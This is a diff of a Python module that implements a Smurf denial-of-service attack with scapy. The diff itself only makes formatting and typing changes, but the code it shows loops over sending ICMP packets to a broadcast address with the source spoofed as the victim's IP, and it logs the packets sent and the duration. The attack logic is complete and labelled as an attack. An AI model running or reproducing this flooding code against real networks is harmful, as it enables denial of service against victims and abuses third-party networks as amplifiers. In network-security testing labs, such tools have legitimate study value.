@@ -10,28 +10,34 @@ License: Proprietary
 Version: 1.0.0
 """
 
-import os, sys, time, argparse, ipaddress
-from typing import Dict, Any
+import argparse
+import ipaddress
+import os
+import sys
+import time
+from typing import Any
 
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
 try:
     from logger import get_logger
 except ImportError:
     import logging
+
     def get_logger(name):
         logger = logging.getLogger(name)
         if not logger.handlers:
             handler = logging.StreamHandler()
-            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+            formatter = logging.Formatter("%(asctime)s - %(name)s - %(levelname)s - %(message)s")
             handler.setFormatter(formatter)
             logger.addHandler(handler)
             logger.setLevel(logging.INFO)
         return logger
 
+
 logger = get_logger(__name__)
 
 try:
-    from scapy.all import IP, ICMP, send, conf
+    from scapy.all import ICMP, IP, conf, send
 except ImportError:
     logger.error("Requires scapy: pip install scapy")
     sys.exit(1)
@@ -53,14 +59,14 @@ class SmurfAttack:
         conf.verb = 1 if verbose else 0
         logger.info(f"Initialized Smurf attack: victim={victim_ip}, broadcast={broadcast_ip}")
 
-    def execute(self) -> Dict[str, Any]:
+    def execute(self) -> dict[str, Any]:
         """Execute the Smurf attack."""
         logger.info(f"Starting Smurf attack: sending {self.count} packets")
         start_time = time.time()
 
         try:
             for i in range(1, self.count + 1):
-                packet = IP(src=self.victim_ip, dst=self.broadcast_ip)/ICMP()
+                packet = IP(src=self.victim_ip, dst=self.broadcast_ip) / ICMP()
                 send(packet, verbose=0)
                 self.packets_sent += 1
 
@@ -75,7 +81,9 @@ class SmurfAttack:
         finally:
             duration = time.time() - start_time
             stats = {"packets_sent": self.packets_sent, "duration_seconds": duration}
-            logger.info(f"Sent {stats['packets_sent']} packets in {stats['duration_seconds']:.2f}s")
+            logger.info(
+                f"Sent {stats['packets_sent']} packets in {stats['duration_seconds']:.2f}s"
+            )
             return stats
 
 
